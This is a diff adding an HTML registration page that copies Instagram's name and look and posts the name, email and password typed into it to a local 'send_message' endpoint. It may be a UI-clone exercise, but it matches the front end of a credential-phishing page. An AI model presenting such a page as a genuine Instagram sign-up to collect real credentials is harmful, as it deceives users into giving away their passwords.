@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Style Registration</title>
+  <style>
+    body {
+      background-color: #fafafa;
+      font-family: 'Arial', sans-serif;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 350px;
+      background-color: #fff;
+      border: 1px solid #dbdbdb;
+      padding: 40px;
+      text-align: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      border-radius: 8px;
+    }
+
+    .container h1 {
+      font-size: 36px;
+      font-weight: bold;
+      color: #262626;
+      margin-bottom: 20px;
+    }
+
+    .container input {
+      width: 100%;
+      padding: 10px;
+      margin-bottom: 10px;
+      border: 1px solid #dbdbdb;
+      border-radius: 5px;
+      background-color: #fafafa;
+    }
+
+    .container button {
+      width: 100%;
+      padding: 10px;
+      background-color: #3897f0;
+      color: white;
+      font-weight: bold;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    .container button:hover {
+      background-color: #3385e6;
+    }
+
+    .footer {
+      margin-top: 20px;
+      font-size: 14px;
+      color: #8e8e8e;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>Instagram</h1>
+    <form action="http://localhost:5000/send_message" method="POST">
+      <input type="text" name="name" placeholder="Full Name" required>
+      <input type="email" name="email" placeholder="Email" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Register</button>
+    </form>
+    <div class="footer">
+      Already have an account? <a href="#">Log in</a>
+    </div>
+  </div>
+</body>
+</html>
